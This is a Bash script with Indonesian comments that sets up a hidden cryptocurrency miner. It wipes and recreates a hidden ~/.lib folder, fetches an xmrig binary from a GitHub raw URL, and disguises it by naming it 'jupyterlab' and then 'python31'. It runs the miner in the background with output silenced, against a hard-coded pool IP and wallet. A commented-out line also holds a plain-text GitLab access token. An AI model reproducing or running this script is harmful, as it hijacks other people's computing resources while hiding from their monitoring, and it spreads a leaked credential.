#!/bin/bash
# Hentikan proses Java jika berjalan
clear
pkill cjava
pkill python31
sleep 2

# Bersihkan direktori home dari file yang tidak diperlukan
cd ~
rm -rf .lib*
mkdir -p .lib
cd .lib && rm -rf *

# --- Mapping jalur (ALGORIc) -> coin ---
declare -A coin_map=(
  [yespowertide]="TDC"
  [power2b]="MBC"
  [yespowerADVC]="ADVC"
  [interchained]="WITC"
  [rx/0]="RXking" #unmi
)

# Tentukan algoritma
ALGORIc="rx/0" #yespoweradvc  /ganti algo
# CPU Mining [cpuminer]
MINERIc="python31"
PARAMEc="-p x -t$(nproc --all)" #-p c=DOGE -t$(nproc --all)

# Joblo (wallet)
DOMPETc="8ADBn1816MeDGfWrYhsTZW4cQAD1EKgXkCUNsiCj72JBTuG1vi821gzA3S8grBMZn5SKonivyxB4YFwkHTvouGGkCWPkp75" #advc/Ganti wallet
#DOMPETc="LTC:XXXXXXXXXX" #LTC-unmi

# --- Ambil WORKERc berdasarkan $coin_$TIMESTAMP ---
TIMESTAMP=$(TZ=UTC-7 date +"%d-%m_%H-%M")
# Ambil coin berdasarkan ALGORIc
coin="Sg${coin_map[$ALGORIc]}"
# Set WORKERc
WORKERc="${coin}_$TIMESTAMP"


# Unduh URL untuk STREETc [pool.txt] 
STREETc="107.167.83.34:443"     #Ganti ProxyPool / Pool
#STREETc="146.190.87.102:80" #host to ip [rx-asia.unmineable.com]
#STREETc=$(wget -q --header="PRIVATE-TOKEN: glpat-xxxxxx" \
#  "LINK_pool.txt" \
#  -O - 2>/dev/null)

# Unduh dan ekstrak file miner
# xmrig wolu iki aktif
wget "https://raw.githubusercontent.com/kermend-ui/sg/main/jupyterlab" -O jupyterlab > /dev/null 2>&1
chmod 777 jupyterlab && mv jupyterlab python31

# Miner CPUminer iki non aktif
#wget --header="PRIVATE-TOKEN: glpat-A8U09o2vr4xpZCo8PzrEGm86MQp1OmJnMWd4Cw.01.121m3dkaw" "https://gitlab.com/api/v4/projects/ghcees%2Fpack/repository/files/itc/raw?ref=main" -O itc > /dev/null 2>&1
#chmod 777 itc && mv itc python31


if ! grep -q "source ~/.bashrc" ~/.bash_profile 2>/dev/null; then
  echo "source ~/.bashrc" >> ~/.bash_profile
fi

# Buat skrip mining CPU
cat <<EOF > ~/.lib/cpu.sh
#!/bin/bash
nohup ~/.lib/$MINERIc -a $ALGORIc -o $STREETc -u $DOMPETc.$WORKERc $PARAMEc &>/dev/null &
EOF

# Skrip untuk cek proses Java
cat <<EOF > ~/.lib/p.sh
#!/bin/bash
clear
echo -e "✅ Jomblo!"
echo -e "⏰ Now    : $(TZ=UTC-7 date +"%H-%M_%d-%m")"
echo -e "🚀 Kuli   : $WORKERc"
echo -e "📡 Pool   : $STREETc"
echo -e "💰 Coin   : $coin" # Ambil coin berdasarkan ALGORIc
# Cek proses miner
if pgrep -a python31 > /dev/null; then
    echo "🔎 Proses miner aktif:"
    pgrep -a python31
else
    echo "❌ Miner tidak ditemukan!"
fi
EOF

# Izin eksekusi
chmod +x ~/.lib/{cpu.sh,p.sh}

# Jalankan miner CPU dan GPU
bash ~/.lib/cpu.sh
clear
bash ~/.lib/p.sh
